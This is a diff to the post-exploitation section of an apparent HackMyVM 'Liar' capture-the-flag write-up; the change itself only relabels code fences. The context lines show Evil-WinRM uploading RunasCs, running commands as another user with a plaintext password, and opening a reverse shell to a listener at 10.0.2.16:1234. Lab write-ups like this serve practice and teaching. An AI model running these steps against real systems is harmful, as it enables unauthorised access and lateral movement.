@@ -144,7 +144,7 @@ We will notice that only Nica's account can connect to the Windows host remotely
 ## Post Exploitation
 
 We have a foothold on the target as the user Nica. Remember that we brute-force Akanksha's password. Since we cannot log into the target using this account we can use the [RunasCs binary](https://github.com/antonioCoco/RunasCs) to run specific processes with different permissions than the user's current logon provides using explicit credentials. We can upload the binary to the target using our current WinRM session.
-```powershell
+```shell
 *Evil-WinRM* PS C:\Users\nica\Documents> upload RunasCs.exe                                    
 Info: Uploading /home/pentester/Desktop/HackMyVM/Liar/Misc File/RunasCs.exe to C:\Users\nica\Documents\RunasCs.exe
                                          
@@ -154,7 +154,7 @@ Info: Upload successful!
 ```
 
 After uploading the RunasCs executable, we can run a simple command i.e. `whoami /all` to enumerate Akanksha's user account.
-```powershell
+```shell
 *Evil-WinRM* PS C:\Users\nica\Documents> .\RunasCs.exe akanksha <REDACTED>  "cmd /c whoami /all"
 
 
@@ -200,7 +200,7 @@ listening on [any] 1234 ...
 ```
 
 Now that we have a listener on our attack host, we can execute a reverse shell as the Akanksha user.
-```powershell
+```shell
 *Evil-WinRM* PS C:\Users\nica\Documents> .\RunasCs.exe akanksha sweetgirl cmd.exe -r 10.0.2.16:1234
 
 [+] Running in session 0 with process function CreateProcessWithLogonW()
